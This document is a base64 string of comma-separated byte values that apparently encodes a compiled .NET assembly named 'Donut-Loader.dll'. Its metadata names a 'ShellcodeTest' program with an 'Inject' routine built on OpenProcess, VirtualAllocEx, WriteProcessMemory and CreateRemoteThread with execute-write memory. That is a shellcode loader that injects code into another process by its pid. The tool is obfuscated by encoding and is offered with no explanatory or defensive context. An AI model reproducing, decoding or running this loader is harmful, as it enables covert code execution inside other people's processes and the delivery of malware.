MCwgMSwgMTY5LCAwLCAxOTcsIDAsIDIxNCwgMCwgMjIzLCA0LCAyMzYsIDQsIDAsIDEsIDUsIDAsIDI1MiwgMCwgMSwgMCwgNiwgMSwgNywgMCwgOCwgMSwgMSwgMCwgNjcsIDEsIDksIDAsIDI0LCAxLCAyLCAwLCA2NSwgMSwgMTEsIDAsIDM5LCAxLCAxLCAwLCA2NCwgMSwgMTMsIDAsIDU0LCAxLCAxLCAwLCAwLCAxLCAxNSwgMCwgNzMsIDEsIDEsIDAsIDAsIDEsIDE5LCAwLCA5OSwgMSwgMSwgMCwgNCwgMTI4LCAwLCAwLCAxLCAwLCAwLCAwLCAzOSwgMjgsIDI4LCA4MCwgMCwgMCwgMCwgMCwgMCwgMCwgMTc1LCA0LCAwLCAwLCA0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxLCAwLCA0OSwgMCwgMCwgMCwgMCwgMCwgNCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgNTgsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDYwLCA3NywgMTExLCAxMDAsIDExNywgMTA4LCAxMDEsIDYyLCAwLCA2OCwgMTExLCAxMTAsIDExNywgMTE2LCA0NSwgNzYsIDExMSwgOTcsIDEwMCwgMTAxLCAxMTQsIDQ2LCAxMDAsIDEwOCwgMTA4LCAwLCA4MCwgMTE0LCAxMTEsIDEwMywgMTE0LCA5NywgMTA5LCAwLCA4MywgMTA0LCAxMDEsIDEwOCwgMTA4LCA5OSwgMTExLCAxMDAsIDEwMSwgODQsIDEwMSwgMTE1LCAxMTYsIDAsIDEwOSwgMTE1LCA5OSwgMTExLCAxMTQsIDEwOCwgMTA1LCA5OCwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCAwLCA3OSwgOTgsIDEwNiwgMTAxLCA5OSwgMTE2LCAwLCA4MCwgODIsIDc5LCA2NywgNjksIDgzLCA4MywgOTUsIDY3LCA4MiwgNjksIDY1LCA4NCwgNjksIDk1LCA4NCwgNzIsIDgyLCA2OSwgNjUsIDY4LCAwLCA4MCwgODIsIDc5LCA2NywgNjksIDgzLCA4MywgOTUsIDgxLCA4NSwgNjksIDgyLCA4OSwgOTUsIDczLCA3OCwgNzAsIDc5LCA4MiwgNzcsIDY1LCA4NCwgNzMsIDc5LCA3OCwgMCwgODAsIDgyLCA3OSwgNjcsIDY5LCA4MywgODMsIDk1LCA4NiwgNzcsIDk1LCA3OSwgODAsIDY5LCA4MiwgNjUsIDg0LCA3MywgNzksIDc4LCAwLCA4MCwgODIsIDc5LCA2NywgNjksIDgzLCA4MywgOTUsIDg2LCA3NywgOTUsIDg3LCA4MiwgNzMsIDg0LCA2OSwgMCwgODAsIDgyLCA3OSwgNjcsIDY5LCA4MywgODMsIDk1LCA4NiwgNzcsIDk1LCA4MiwgNjksIDY1LCA2OCwgMCwgNzcsIDY5LCA3NywgOTUsIDY3LCA3OSwgNzcsIDc3LCA3MywgODQsIDAsIDc3LCA2OSwgNzcsIDk1LCA4MiwgNjksIDgzLCA2OSwgODIsIDg2LCA2OSwgMCwgODAsIDY1LCA3MSwgNjksIDk1LCA4MiwgNjksIDY1LCA2OCwgODcsIDgyLCA3MywgODQsIDY5LCAwLCA4MCwgNjUsIDcxLCA2OSwgOTUsIDY5LCA4OCwgNjksIDY3LCA4NSwgODQsIDY5LCA5NSwgODIsIDY5LCA2NSwgNjgsIDg3LCA4MiwgNzMsIDg0LCA2OSwgMCwgMTIwLCA1NCwgNTIsIDAsIDEyMCwgNTYsIDU0LCAwLCAxMTIsIDEwNSwgMTAwLCAwLCA3NywgOTcsIDEwNSwgMTEwLCAwLCA3OSwgMTEyLCAxMDEsIDExMCwgODAsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgMCwgNzEsIDEwMSwgMTE2LCA3NywgMTExLCAxMDAsIDExNywgMTA4LCAxMDEsIDcyLCA5NywgMTEwLCAxMDAsIDEwOCwgMTAxLCAwLCA3MSwgMTAxLCAxMTYsIDgwLCAxMTQsIDExMSwgOTksIDY1LCAxMDAsIDEwMCwgMTE0LCAxMDEsIDExNSwgMTE1LCAwLCA4NiwgMTA1LCAxMTQsIDExNiwgMTE3LCA5NywgMTA4LCA2NSwgMTA4LCAxMDgsIDExMSwgOTksIDY5LCAxMjAsIDAsIDg3LCAxMTQsIDEwNSwgMTE2LCAxMDEsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDc3LCAxMDEsIDEwOSwgMTExLCAxMTQsIDEyMSwgMCwgNjcsIDExNCwgMTAxLCA5NywgMTE2LCAxMDEsIDgyLCAxMDEsIDEwOSwgMTExLCAxMTYsIDEwMSwgODQsIDEwNCwgMTE0LCAxMDEsIDk3LCAxMDAsIDAsIDczLCAxMTAsIDEwNiwgMTAxLCA5OSwgMTE2LCAwLCA3MywgMTE1LCA4NywgMTExLCAxMTksIDU0LCA1MiwgODAsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgMCwgODMsIDEyMSwgMTE1LCAxMTYsIDEwMSwgMTA5LCA0NiwgNjgsIDEwNSwgOTcsIDEwMywgMTEwLCAxMTEsIDExNSwgMTE2LCAxMDUsIDk5LCAxMTUsIDAsIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDAsIDQ2LCA5OSwgMTE2LCAxMTEsIDExNCwgMCwgOTcsIDExNCwgMTAzLCAxMTUsIDAsIDEwMCwgMTE5LCA2OCwgMTAxLCAxMTUsIDEwNSwgMTE0LCAxMDEsIDEwMCwgNjUsIDk5LCA5OSwgMTAxLCAxMTUsIDExNSwgMCwgOTgsIDczLCAxMTAsIDEwNCwgMTAxLCAxMTQsIDEwNSwgMTE2LCA3MiwgOTcsIDExMCwgMTAwLCAxMDgsIDEwMSwgMCwgMTAwLCAxMTksIDgwLCAxMTQsIDExMSwgOTksIDEwMSwgMTE1LCAxMTUsIDczLCAxMDAsIDAsIDEwOCwgMTEyLCA3NywgMTExLCAxMDAsIDExNywgMTA4LCAxMDEsIDc4LCA5NywgMTA5LCAxMDEsIDAsIDEwNCwgNzcsIDExMSwgMTAwLCAxMTcsIDEwOCwgMTAxLCAwLCAxMTIsIDExNCwgMTExLCA5OSwgNzgsIDk3LCAxMDksIDEwMSwgMCwgMTA0LCA4MCwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCAwLCAxMDgsIDExMiwgNjUsIDEwMCwgMTAwLCAxMTQsIDEwMSwgMTE1LCAxMTUsIDAsIDEwMCwgMTE5LCA4MywgMTA1LCAxMjIsIDEwMSwgMCwgMTAyLCAxMDgsIDY1LCAxMDgsIDEwOCwgMTExLCA5OSwgOTcsIDExNiwgMTA1LCAxMTEsIDExMCwgODQsIDEyMSwgMTEyLCAxMDEsIDAsIDEwMiwgMTA4LCA4MCwgMTE0LCAxMTEsIDExNiwgMTAxLCA5OSwgMTE2LCAwLCAxMDgsIDExMiwgNjYsIDk3LCAxMTUsIDEwMSwgNjUsIDEwMCwgMTAwLCAxMTQsIDEwMSwgMTE1LCAxMTUsIDAsIDEwOCwgMTEyLCA2NiwgMTE3LCAxMDIsIDEwMiwgMTAxLCAxMTQsIDAsIDExMCwgODMsIDEwNSwgMTIyLCAxMDEsIDAsIDEwOCwgMTEyLCA3OCwgMTE3LCAxMDksIDk4LCAxMDEsIDExNCwgNzksIDEwMiwgNjYsIDEyMSwgMTE2LCAxMDEsIDExNSwgODcsIDExNCwgMTA1LCAxMTYsIDExNiwgMTAxLCAxMTAsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDgyLCAxMTcsIDExMCwgMTE2LCAxMDUsIDEwOSwgMTAxLCA0NiwgNzMsIDExMCwgMTE2LCAxMDEsIDExNCwgMTExLCAxMTIsIDgzLCAxMDEsIDExNCwgMTE4LCAxMDUsIDk5LCAxMDEsIDExNSwgMCwgNzksIDExNywgMTE2LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgMTA4LCAxMTIsIDg0LCAxMDQsIDExNCwgMTAxLCA5NywgMTAwLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMTE1LCAwLCAxMDAsIDExOSwgODMsIDExNiwgOTcsIDk5LCAxMDcsIDgzLCAxMDUsIDEyMiwgMTAxLCAwLCAxMDgsIDExMiwgODMsIDExNiwgOTcsIDExNCwgMTE2LCA2NSwgMTAwLCAxMDAsIDExNCwgMTAxLCAxMTUsIDExNSwgMCwgMTA4LCAxMTIsIDgwLCA5NywgMTE0LCA5NywgMTA5LCAxMDEsIDExNiwgMTAxLCAxMTQsIDAsIDEwMCwgMTE5LCA2NywgMTE0LCAxMDEsIDk3LCAxMTYsIDEwNSwgMTExLCAxMTAsIDcwLCAxMDgsIDk3LCAxMDMsIDExNSwgMCwgMTA4LCAxMTIsIDg0LCAxMDQsIDExNCwgMTAxLCA5NywgMTAwLCA3MywgMTAwLCAwLCAxMTIsIDExNCwgMTExLCA5OSwgODAsIDczLCA2OCwgMCwgMTA4LCAxMTIsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNzMsIDExMCwgMTAyLCAxMTEsIDAsIDExMiwgMTE0LCAxMTEsIDk5LCAxMDEsIDExNSwgMTE1LCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMSwgNDYsIDg2LCAxMDEsIDExNCwgMTE1LCAxMDUsIDExMSwgMTEwLCAxMDUsIDExMCwgMTAzLCAwLCA4NCwgOTcsIDExNCwgMTAzLCAxMDEsIDExNiwgNzAsIDExNCwgOTcsIDEwOSwgMTAxLCAxMTksIDExMSwgMTE0LCAxMDcsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA4MiwgMTAxLCAxMDIsIDEwOCwgMTAxLCA5OSwgMTE2LCAxMDUsIDExMSwgMTEwLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDg0LCAxMDUsIDExNiwgMTA4LCAxMDEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTUsIDEwMSwgMTA5LCA5OCwgMTA4LCAxMjEsIDY4LCAxMDEsIDExNSwgOTksIDExNCwgMTA1LCAxMTIsIDExNiwgMTA1LCAxMTEsIDExMCwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgNjcsIDExMSwgMTEwLCAxMDIsIDEwNSwgMTAzLCAxMTcsIDExNCwgOTcsIDExNiwgMTA1LCAxMTEsIDExMCwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgNjcsIDExMSwgMTA5LCAxMTIsIDk3LCAxMTAsIDEyMSwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgODAsIDExNCwgMTExLCAxMDAsIDExNywgOTksIDExNiwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgNjcsIDExMSwgMTEyLCAxMjEsIDExNCwgMTA1LCAxMDMsIDEwNCwgMTE2LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA4NCwgMTE0LCA5NywgMTAwLCAxMDEsIDEwOSwgOTcsIDExNCwgMTA3LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA2NywgMTE3LCAxMDgsIDExNiwgMTE3LCAxMTQsIDEwMSwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY3LCAxMTEsIDEwOSwgODYsIDEwNSwgMTE1LCAxMDUsIDk4LCAxMDgsIDEwMSwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgODYsIDEwMSwgMTE0LCAxMTUsIDEwNSwgMTExLCAxMTAsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2OCwgMTAxLCA5OCwgMTE3LCAxMDMsIDEwMywgOTcsIDk4LCAxMDgsIDEwMSwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY4LCAxMDEsIDk4LCAxMTcsIDEwMywgMTAzLCAxMDUsIDExMCwgMTAzLCA3NywgMTExLCAxMDAsIDEwMSwgMTE1LCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMSwgNDYsIDY3LCAxMTEsIDEwOSwgMTEyLCAxMDUsIDEwOCwgMTAxLCAxMTQsIDgzLCAxMDEsIDExNCwgMTE4LCAxMDUsIDk5LCAxMDEsIDExNSwgMCwgNjcsIDExMSwgMTA5LCAxMTIsIDEwNSwgMTA4LCA5NywgMTE2LCAxMDUsIDExMSwgMTEwLCA4MiwgMTAxLCAxMDgsIDk3LCAxMjAsIDk3LCAxMTYsIDEwNSwgMTExLCAxMTAsIDExNSwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDgyLCAxMTcsIDExMCwgMTE2LCAxMDUsIDEwOSwgMTAxLCA2NywgMTExLCAxMDksIDExMiwgOTcsIDExNiwgMTA1LCA5OCwgMTA1LCAxMDgsIDEwNSwgMTE2LCAxMjEsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2OCwgMTExLCAxMTAsIDExNywgMTE2LCA0NSwgNzYsIDExMSwgOTcsIDEwMCwgMTAxLCAxMTQsIDAsIDY3LCAxMTEsIDExMCwgMTE4LCAxMDEsIDExNCwgMTE2LCAwLCA4NCwgMTExLCA3MywgMTEwLCAxMTYsIDUxLCA1MCwgMCwgNjgsIDEwOCwgMTA4LCA3MywgMTA5LCAxMTIsIDExMSwgMTE0LCAxMTYsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCAxMDcsIDEwMSwgMTE0LCAxMTAsIDEwMSwgMTA4LCA1MSwgNTAsIDQ2LCAxMDAsIDEwOCwgMTA4LCAwLCAxMDcsIDEwMSwgMTE0LCAxMTAsIDEwMSwgMTA4LCA1MSwgNTAsIDAsIDcxLCAxMDEsIDExNiwgODAsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgNjYsIDEyMSwgNzMsIDEwMCwgMCwgMTAzLCAxMDEsIDExNiwgOTUsIDczLCAxMDAsIDAsIDY3LCAxMTEsIDExMCwgMTE1LCAxMTEsIDEwOCwgMTAxLCAwLCA4NywgMTE0LCAxMDUsIDExNiwgMTAxLCA3NiwgMTA1LCAxMTAsIDEwMSwgMCwgNzAsIDExNCwgMTExLCAxMDksIDY2LCA5NywgMTE1LCAxMDEsIDU0LCA1MiwgODMsIDExNiwgMTE0LCAxMDUsIDExMCwgMTAzLCAwLCA3MywgMTEwLCAxMTYsIDgwLCAxMTYsIDExNCwgMCwgOTAsIDEwMSwgMTE0LCAxMTEsIDAsIDEwMywgMTAxLCAxMTYsIDk1LCA3MiwgOTcsIDExMCwgMTAwLCAxMDgsIDEwMSwgMCwgNDYsIDk5LCA5OSwgMTE2LCAxMTEsIDExNCwgMCwgNzEsIDEwMSwgMTE2LCA2NywgMTE3LCAxMTQsIDExNCwgMTAxLCAxMTAsIDExNiwgODAsIDExNCwgMTExLCA5OSwgMTAxLCAxMTUsIDExNSwgMCwgMCwgMCwgMCwgMSwgMCwgMCwgNTMsIDE4MCwgMTUxLCA1OCwgMTA2LCA0NiwgMTIsIDc0LCAxNDgsIDEzMCwgNiwgMTQsIDE4MCwgNDgsIDYzLCAyMzAsIDAsIDgsIDE4MywgMTIyLCA5MiwgODYsIDI1LCA1MiwgMjI0LCAxMzcsIDIsIDYsIDgsIDQsIDIsIDAsIDAsIDAsIDQsIDAsIDQsIDAsIDAsIDQsIDgsIDAsIDAsIDAsIDQsIDMyLCAwLCAwLCAwLCA0LCAxNiwgMCwgMCwgMCwgMiwgNiwgOSwgNCwgMCwgMTYsIDAsIDAsIDQsIDAsIDMyLCAwLCAwLCA0LCA0LCAwLCAwLCAwLCA0LCA2NCwgMCwgMCwgMCwgMiwgNiwgMTQsIDUsIDAsIDEsIDEsIDI5LCAxNCwgNiwgMCwgMywgMjQsIDgsIDIsIDgsIDQsIDAsIDEsIDI0LCAxNCwgNSwgMCwgMiwgMjQsIDI0LCAxNCwgOCwgMCwgNSwgMjQsIDI0LCAyNCwgOSwgOSwgOSwgMTAsIDAsIDUsIDIsIDI0LCAyNCwgMjksIDUsIDksIDE2LCAyNSwgMTAsIDAsIDcsIDI0LCAyNCwgMjQsIDksIDI0LCAyNCwgOSwgMjQsIDYsIDAsIDMsIDgsIDE0LCAxNCwgOCwgNiwgMCwgMiwgMiwgMjQsIDE2LCAyLCA1LCAwLCAxLCAyLCAxOCwgOSwgMywgMzIsIDAsIDEsIDQsIDMyLCAxLCAxLCAxNCwgNCwgMzIsIDEsIDEsIDIsIDUsIDMyLCAxLCAxLCAxNywgNjUsIDQsIDMyLCAxLCAxLCA4LCA0LCAwLCAxLCA4LCAxNCwgMywgNywgMSwgMiwgNSwgMCwgMSwgMTgsIDksIDgsIDMsIDMyLCAwLCA4LCA0LCAwLCAxLCAxLCA4LCA1LCAwLCAxLCAyOSwgNSwgMTQsIDIsIDYsIDI0LCAxMiwgNywgOCwgMTgsIDksIDE0LCAyOSwgNSwgMjQsIDI0LCAyNSwgOCwgMiwgMywgMzIsIDAsIDI0LCA0LCA3LCAyLCAyLCAyLCAzLCAwLCAwLCAxLCA0LCAwLCAwLCAxOCwgOSwgNTUsIDEsIDAsIDI2LCA0NiwgNzgsIDY5LCA4NCwgNzAsIDExNCwgOTcsIDEwOSwgMTAxLCAxMTksIDExMSwgMTE0LCAxMDcsIDQ0LCA4NiwgMTAxLCAxMTQsIDExNSwgMTA1LCAxMTEsIDExMCwgNjEsIDExOCwgNTIsIDQ2LCA1MywgMSwgMCwgODQsIDE0LCAyMCwgNzAsIDExNCwgOTcsIDEwOSwgMTAxLCAxMTksIDExMSwgMTE0LCAxMDcsIDY4LCAxMDUsIDExNSwgMTEyLCAxMDgsIDk3LCAxMjEsIDc4LCA5NywgMTA5LCAxMDEsIDAsIDE3LCAxLCAwLCAxMiwgNjgsIDExMSwgMTEwLCAxMTcsIDExNiwgNDUsIDc2LCAxMTEsIDk3LCAxMDAsIDEwMSwgMTE0LCAwLCAwLCA1LCAxLCAwLCAwLCAwLCAwLCAxOSwgMSwgMCwgMTQsIDY3LCAxMTEsIDExMiwgMTIxLCAxMTQsIDEwNSwgMTAzLCAxMDQsIDExNiwgMzIsIDUwLCA0OCwgNDksIDU3LCAwLCAwLCA4LCAxLCAwLCA3LCAxLCAwLCAwLCAwLCAwLCA4LCAxLCAwLCA4LCAwLCAwLCAwLCAwLCAwLCAzMCwgMSwgMCwgMSwgMCwgODQsIDIsIDIyLCA4NywgMTE0LCA5NywgMTEyLCA3OCwgMTExLCAxMTAsIDY5LCAxMjAsIDk5LCAxMDEsIDExMiwgMTE2LCAxMDUsIDExMSwgMTEwLCA4NCwgMTA0LCAxMTQsIDExMSwgMTE5LCAxMTUsIDEsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDQxLCA2NCwgMTM5LCA5MywgMCwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMjgsIDEsIDAsIDAsIDQ4LCA0NSwgMCwgMCwgNDgsIDI5LCAwLCAwLCA4MiwgODMsIDY4LCA4MywgNjYsIDMzLCAyMDMsIDIxNiwgMTg0LCA0NCwgMTksIDczLCAxNzMsIDEyNywgMTA3LCAyMTcsIDEwNywgMjEyLCAxNjUsIDIzOSwgMywgMCwgMCwgMCwgOTksIDU4LCA5MiwgODUsIDExNSwgMTAxLCAxMTQsIDExNSwgOTIsIDExMywgNTIsIDU2LCA1NywgNTAsIDUzLCA0OCwgNDksIDU2LCA5MiwgNjgsIDExMSwgOTksIDExNywgMTA5LCAxMDEsIDExMCwgMTE2LCAxMTUsIDkyLCA4MywgMTA0LCA5NywgMTE0LCAxMTIsIDY4LCAxMDEsIDExOCwgMTAxLCAxMDgsIDExMSwgMTEyLCAzMiwgODAsIDExNCwgMTExLCAxMDYsIDEwMSwgOTksIDExNiwgMTE1LCA5MiwgNjgsIDExMSwgMTEwLCAxMTcsIDExNiwgNDUsIDc2LCAxMTEsIDk3LCAxMDAsIDEwMSwgMTE0LCA5MiwgNjgsIDExMSwgMTEwLCAxMTcsIDExNiwgNDUsIDc2LCAxMTEsIDk3LCAxMDAsIDEwMSwgMTE0LCA5MiwgMTExLCA5OCwgMTA2LCA5MiwgNjgsIDEwMSwgOTgsIDExNywgMTAzLCA5MiwgNjgsIDExMSwgMTEwLCAxMTcsIDExNiwgNDUsIDc2LCAxMTEsIDk3LCAxMDAsIDEwMSwgMTE0LCA0NiwgMTEyLCAxMDAsIDk4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxLCAwLCAxNiwgMCwgMCwgMCwgMjQsIDAsIDAsIDEyOCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMSwgMCwgMCwgMCwgNDgsIDAsIDAsIDEyOCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMCwgMCwgMCwgMCwgNzIsIDAsIDAsIDAsIDg4LCA2NCwgMCwgMCwgMjUyLCAyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAyNTIsIDIsIDUyLCAwLCAwLCAwLCA4NiwgMCwgODMsIDAsIDk1LCAwLCA4NiwgMCwgNjksIDAsIDgyLCAwLCA4MywgMCwgNzMsIDAsIDc5LCAwLCA3OCwgMCwgOTUsIDAsIDczLCAwLCA3OCwgMCwgNzAsIDAsIDc5LCAwLCAwLCAwLCAwLCAwLCAxODksIDQsIDIzOSwgMjU0LCAwLCAwLCAxLCAwLCAwLCAwLCAxLCAwLCAyOCwgODAsIDM5LCAyOCwgMCwgMCwgMSwgMCwgMjgsIDgwLCAzOSwgMjgsIDYzLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA0LCAwLCAwLCAwLCAyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2OCwgMCwgMCwgMCwgMSwgMCwgODYsIDAsIDk3LCAwLCAxMTQsIDAsIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCA3MywgMCwgMTEwLCAwLCAxMDIsIDAsIDExMSwgMCwgMCwgMCwgMCwgMCwgMzYsIDAsIDQsIDAsIDAsIDAsIDg0LCAwLCAxMTQsIDAsIDk3LCAwLCAxMTAsIDAsIDExNSwgMCwgMTA4LCAwLCA5NywgMCwgMTE2LCAwLCAxMDUsIDAsIDExMSwgMCwgMTEwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxNzYsIDQsIDkyLCAyLCAwLCAwLCAxLCAwLCA4MywgMCwgMTE2LCAwLCAxMTQsIDAsIDEwNSwgMCwgMTEwLCAwLCAxMDMsIDAsIDcwLCAwLCAxMDUsIDAsIDEwOCwgMCwgMTAxLCAwLCA3MywgMCwgMTEwLCAwLCAxMDIsIDAsIDExMSwgMCwgMCwgMCwgNTYsIDIsIDAsIDAsIDEs